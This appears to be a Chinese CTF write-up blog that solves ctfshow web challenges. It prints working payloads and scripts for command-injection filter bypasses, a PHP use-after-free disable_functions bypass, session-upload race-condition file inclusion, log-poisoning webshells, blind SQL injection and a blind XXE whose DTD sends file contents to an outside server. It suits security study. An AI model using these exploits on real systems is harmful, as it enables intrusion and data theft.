`Abnormal connection`表示异常连接
`evil input`表示被过滤了

感觉像是命令执行，但发现很多字符串都被过滤了，爆破一下康康有什么没有被过滤
发现：
>小写字母全被过滤。大写字母、数字、`$`、`:`、`?`、`{}`没被过滤

linux里有一个环境变量$PATH，可以用它来构造小写字母执行命令。

![](https://img-blog.csdnimg.cn/20201005193423587.png#pic_center)首先`ls`，即`0;${PATH:5:1}${PATH:2:1}`

![](https://img-blog.csdnimg.cn/20201005193655345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)最后`nl flag.php`，即`0;${PATH:14:1}${PATH:5:1} ????.???`

也可以构造`cat flag.php`：`${PATH:23:1}${PWD:2:1}${HOME:12:1} ????.???`
![](https://img-blog.csdnimg.cn/20201005194040381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
最后师傅们出的题都很有意思，学到了很多，感谢师傅们
参考：
[ctfshow-月饼杯WP](https://blog.csdn.net/hiahiachang/article/details/108800210)
[ctfshow月饼杯 web wp](https://blog.csdn.net/qq_46091464/article/details/108827377)

## web入门
### web55 
题目给出了源码：
```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```
**base64**
我们就可以通过通配符进行匹配命令执行查看flag.php
payload：`?c=/???/????64 ????.???` 即  `/bin/base64 flag.php`

![](https://img-blog.csdnimg.cn/20201005200434864.png#pic_center)最后解码即可
![](https://img-blog.csdnimg.cn/20201005200505596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
**bzip2**
我们可以通过该命令压缩 flag.php 然后进行下载
payload：`?c=/???/???/????2 ????.???` 也就是 `/usr/bin/bzip2 flag.php`
然后访问`/flag.php.bz2`进行下载
![](https://img-blog.csdnimg.cn/20201005200753720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
**p神，yyds**
>`.`或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则`. file`的意思就是用bash执行file文件中的命令。
用. file执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用.来执行它了吗？
这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。
大写字母位于`@`与`[`之间：利用`[@-[]`来表示大写字母

那么构造一个POST请求
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://a549c521-fb74-495d-995d-8521b7ea82e8.chall.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```
进行抓包，并传入post数据，payload：`?c=.+/???/????????[@-[]`
```sh
#!/bin/sh
cat flag.php
```
![](https://img-blog.csdnimg.cn/20201005203400377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

参考：
[继无字母数字的命令执行(ctfshow web入门 55)新姿势](https://blog.csdn.net/qq_46091464/article/details/108555433)
[无字母数字的命令执行(ctfshow web入门 55)](https://blog.csdn.net/qq_46091464/article/details/108513145)
[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

### 红包题第二弹 
再做做加强版的，查看源码发现给了一个cmd
![](https://img-blog.csdnimg.cn/20201005203912779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)得到源码：
```php
<?php
if(isset($_GET['cmd'])){
	$cmd=$_GET['cmd'];
	highlight_file(__FILE__);
	if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
		die("cerror");
        }
	if(preg_match("/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){
		die("serror");
		}
     eval($cmd);
}
?>
```
ban掉了除小写p以外的所有数字字母，以及所有位运算符和`$`、 `_`、括号等符号
本题同理创建上传表单，包含临时文件执行代码，使用`.`执行代码
>发现反引号执行代码无回显，那么需要echo，`<?=`是echo()的别名用法，并且在php7的情况下无论short_open_tag是否开了都可以使用。

本题需要先`?>`把前面的`<?php`给闭合掉才可以：
```php
?cmd=?><?=`.+/???/p?p??????`;
```
由于存在p，那么直接可以用`/???/p?p??????`表示这个临时文件
![](https://img-blog.csdnimg.cn/20201005205521881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

参考：[以CTFSHOW红包题为例研究无字母数字RCE](https://www.gem-love.com/websecurity/1407.html)

### web57 
同样给出了源码：
```php
<?php
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
} 
```
需要构造出字符串36，不会，看wp发现：
`${_}=""`
`$((${_}))=0`
`$((~$((${_}))))=-1`
![](https://img-blog.csdnimg.cn/20201005225718382.png#pic_center)
payload：
```php
$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```
![](https://img-blog.csdnimg.cn/20201005230214421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
最后查看源码得到flag
![](https://img-blog.csdnimg.cn/20201005230451729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
### web72
给出了源代码：
```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
```
```php
绕过open_basedir：
//可绕72的目录限制,但无法读文件
c=$a=opendir("glob:///*"); while (($file = readdir($a)) !== false){echo $file . "<br>"; };include("flagx.txt");exit();
c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit(0);
```
 ![](https://img-blog.csdnimg.cn/20201010152948699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
 最后使用uaf脚本绕过即可得到flag
 
```php
c=?><?php
pwn("ls /;cat /flag0.txt");

function pwn($cmd) {
    global $abc, $helper, $backtrace;
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf('%c',$ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf('%c',$v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);
    exit();
}
```
![](https://img-blog.csdnimg.cn/20201010154253235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
### web73-74
```php
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit(0);?>
```
![](https://img-blog.csdnimg.cn/20201010155428880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
```php
c=$a=opendir("/"); while (($file = readdir($a)) !== false){echo $file . "<br>"; };include("/flagx.txt");exit();
```
![](https://img-blog.csdnimg.cn/20201010155501480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
### web75-76
```php
c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit(0);
```
![](https://img-blog.csdnimg.cn/20201010163554943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
这题需要利用mysql的`load_file`读文件
```php
try {
  $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');
  foreach($dbh->query('select load_file("/flag36.txt")') as $row) {
      echo($row[0])."|";
  }
  $dbh = null;
} catch (PDOException $e) {
  echo $e->getMessage();
  die();
}exit(0);
```
通过连接数据库执行命令
![](https://img-blog.csdnimg.cn/2020101016421121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
### web77
>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。

首先访问根目录下的东西：
```php
$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit(0);
```
![](https://img-blog.csdnimg.cn/20201010172539501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

通过FFI（7.4版本），执行代码
```php
$ffi=FFI::cdef("int system(const char *command);");//创建一个system对象
$a='/readflag > 1.txt';//没有回显的
$ffi->system($a);//通过$ffi去调用system函数
exit(0);
 ```
![](https://img-blog.csdnimg.cn/20201010172604377.png#pic_center)

### web82-86
这里直接是web86，给出了源码：
```php
 <?php
define('还要秀？', dirname(__FILE__));
set_include_path(还要秀？);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);

    
}else{
    highlight_file(__FILE__);
} 
```
参考：[利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/vuls/202819.html)
利用session.upload_progress将恶意语句写入session文件，从而包含session文件
>问题一:
代码里没有session_start(),如何创建session文件呢?
解答一
其实，如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。
但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。
问题二:
但是问题来了，默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空，
如何进行rce呢？
解答二
此时我们可以利用竞争，在session文件内容清空前进行包含利用。

python脚本如下：
```python
import io
import requests
import threading
sessID = 'flag'
url = 'http://5a3cd120-8d65-43c9-820b-0a0afbfe763e.chall.ctf.show/'
def write(session):
    while True:
        f = io.BytesIO(b'a'*256*1) #建议正常这个填充数据大一点
        response = session.post(
            url,
            cookies={'PHPSESSID': sessID},
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac *.php");?>'},
            files={'file': ('a.txt', f)}
            )
def read():
    while True:
        response = session.get(url+'?file=/tmp/sess_{}'.format(sessID))
        if 'flag' in response.text:
            print(response.text)
            break
session = requests.session()
write = threading.Thread(target=write, args=(session,))
write.daemon = True #当daemon为True时，父线程在运行完毕后，子线程无论是否正在运行，都会伴随主线程一起退出。
write.start()
read()
```
![](https://img-blog.csdnimg.cn/20201010184325494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)可参考：[2020 WMCTF Web Writeup](https://www.4hou.com/posts/vD7X)
### web87
参考：[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163)
题目源码如下：
```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);

    
}else{
    highlight_file(__FILE__);
} 
```
由于存在：`urldecode($file)`，需要进行两次url编码，`php://filter/write=string.rot13/resource=2.php`
```url
?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30
```
![](https://img-blog.csdnimg.cn/202010111759154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
`<?php system('ls');?>`进行rot13编码为`<?cuc flfgrz('yf');?>`，content传入即可
![](https://img-blog.csdnimg.cn/20201011125936650.png#pic_center)
再读取即可`<?php system('cat *');?>`编码为`<?cuc flfgrz('png *');?>`
![](https://img-blog.csdnimg.cn/20201011130445453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)也可以使用`php://filter/write=convert.base64-decode/resource=3.php`
```url
?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30
```
因为通过base64过滤之后就只有`phpdie`6个字符我们就要添加2个字符让前面的可以进行编码，即：
`<?php system('ls');?>`==>`PD9waHAgc3lzdGVtKCdscycpOz8+` content传入`aaPD9waHAgc3lzdGVtKCdscycpOz8+`

## web_AK赛

### 签到_观己_WEB_AK赛
给出了源码：
```php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match('/php/i', $file)){
        die('error');
    }else{
        include($file);
    }

}else{
    highlight_file(__FILE__);
}

?>
```
非预期直接文件包含得到flag
![](https://img-blog.csdnimg.cn/20201006124732926.png#pic_center)
按照正规的来写吧，使用伪协议data进行
`?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=`
![](https://img-blog.csdnimg.cn/20201006124159710.png#pic_center)发现：allow_url_include=0 ，说明php.ini的allow_url_include = off

![](https://img-blog.csdnimg.cn/20201006124250915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
这里改为使用日志包含，发现日志存在/var/log/nginx/access.log中

![](https://img-blog.csdnimg.cn/20201006125300450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
将一句话木马写入日志文件，最后发现UA头的一句话木马不会被PHP代码检测

![](https://img-blog.csdnimg.cn/20201006130449838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
蚁剑连接即可得到flag
![](https://img-blog.csdnimg.cn/20201006130545761.png#pic_center)

### web2_观星_WEB_AK赛

过滤了
```sql
and、=、'、||、"、 、order、by、like、union、,、char、ascii、sleep、limit、BENCHMARK、-- -
```
>过滤了`=`，可以用`regexp`代替，可以用`case(x)when(y)then(1)else(2)end`代替`if`，相当于if(x=y,1,2)
`ascii`可以用`ord`代替,`hex`也行
`substr('flag',1,1)`可以用`substr('flag')from(1)for(1)`代替

wh1sper师傅的脚本：
```python
import requests
host = 'http://6d40c5f4-b306-43c2-b70d-342ca79ad9fd.chall.ctf.show/index.php?id='
def mid(bot, top):
    return (int)(0.5 * (top + bot))
def sqli():
    name = ''
    for j in range(1, 250):
        top = 126
        bot = 32
        while 1:
            #babyselect = 'database()'---web1
            #babyselect = '(select group_concat(table_name) from information_schema.tables where table_schema regexp database())'---flag,page,user
            #babyselect = '(select group_concat(column_name) from information_schema.columns where table_name regexp 0x666c6167)'---FLAG_COLUMN,flag
            babyselect = '(select flag from flag)'
            select = "0 or ord(substr({} from {} for 1))>{}".format(babyselect, j, mid(bot, top))
            r = requests.get(url=host + select.replace(' ', '/**/'))
            #print(host + select.replace(' ', '/**/'))
            if 'Child' in r.text:
                if top - 1 == bot:
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)
            else:
                if top - 1 == bot:
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)
if __name__ == '__main__':
    sqli()
```
羽师傅的脚本：
```python
import requests
url="http://6d40c5f4-b306-43c2-b70d-342ca79ad9fd.chall.ctf.show/index.php?id=1^"
flag=""
for i in range(1,50):
    print("i="+str(i))
    for j in range(38,126):
        #u="case(ord(substr(database()from({0})for(1))))when({1})then(2)else(3)end".format(i,j)  #库名  web1
        #u="case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from({0})for(1))))when({1})then(2)else(3)end".format(i,j) #表名 flag、page、user
        #u="case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp(0x666c6167))from({0})for(1))))when({1})then(2)else(3)end".format(i,j) #列名 FLAG_COLUMN、flag
        u="case(ord(substr((select(group_concat(flag))from(flag))from({0})for(1))))when({1})then(2)else(3)end".format(i,j) #flag字段
        u=url+u
        r=requests.get(u,timeout=100)
        t=r.text
        if("I asked nothing" in t):
            flag+=chr(j)
            print(flag)
            break
```

### web3_观图_WEB_AK赛
查看源码得到
![](https://img-blog.csdnimg.cn/20201006140111595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
那么先查看showImage.php得到源码：
```php
<?php
//$key = substr(md5('ctfshow'.rand()),3,8);
//flag in config.php
include('config.php');
if(isset($_GET['image'])){
    $image=$_GET['image'];
    $str = openssl_decrypt($image, 'bf-ecb', $key);
    if(file_exists($str)){
        header('content-type:image/gif');
        echo file_get_contents($str);
    }
}else{
    highlight_file(__FILE__);
}
?> 
```
发现是des加密，尝试爆破`'ctfshow'.rand()`中rand()所产生的值，师傅的爆破脚本：

```php
<?php
$len = rand();
print ($len."\n");
for($i=0;$i<$len;$i++){
    $key = substr(md5('ctfshow'.$i),3,8);
    $image="Z6Ilu83MIDw=";
    $str = openssl_decrypt($image, 'bf-ecb', $key);
    if(strpos($str,"gif") or strpos($str,"jpg") or strpos($str,"png")){
        print($str." ");
        print($i);
        break;
    }
}
?>
```
![](https://img-blog.csdnimg.cn/20201006141351878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
那么得到了秘钥key，接下来加密config.php
```php
<?php
$i = 27347;
$key = substr(md5('ctfshow'.$i),3,8);
$c = "config.php";
print(openssl_encrypt($c,'bf-ecb', $key));
?>
```
得到`N6bf8Bd8jm0SpmTZGl0isw==`
![](https://img-blog.csdnimg.cn/2020100614212844.png#pic_center)使用wget把图片文件下载下来。然后查看即可
![](https://img-blog.csdnimg.cn/20201006142516340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
### web4_观心_WEB_AK赛
第一步查看源码
![](https://img-blog.csdnimg.cn/20201006143232170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)第二步抓包康康到底执行了什么命令

![](https://img-blog.csdnimg.cn/20201006143720918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
是xxe漏洞，直接上payload发现无回显，看wp发现为Blind XXE，参考文章：[XXE漏洞利用技巧：从XML到远程代码执行](https://www.freebuf.com/articles/web/177979.html)
需要在vps上配置两个文件
test.xml：
```xml
<?xml version="1.0" encoding="utf-8"?> 

<!DOCTYPE test [ 

<!ENTITY % remote SYSTEM "http://47.101.145.94/test.dtd"> 

%remote;%int;%send; ]>

<reset><login>bee</login><secret>Any bugs?</secret></reset>
```
test.dtd：
```
<!ENTITY % p1 SYSTEM "php://filter/read=convert-base64.encode/resource=/flag.txt">
<!ENTITY % p2 "<!ENTITY xxe SYSTEM 'http://47.101.145.94/pass=%p1;'>">
%p2;
```
最终得到flag
![](https://img-blog.csdnimg.cn/20201006145130746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
参考：
[anweilx ：ctfshow——web_AK赛 ](https://www.cnblogs.com/anweilx/p/13417899.html)
[wh1sper：ctfshow_webak赛](http://wh1sper.cn/?p=3461)
[羽：CTFSHOW WEB_AK赛
](https://blog.csdn.net/miuzzx/article/details/107706685)

## web_内部赛
### web1_签到_内部赛
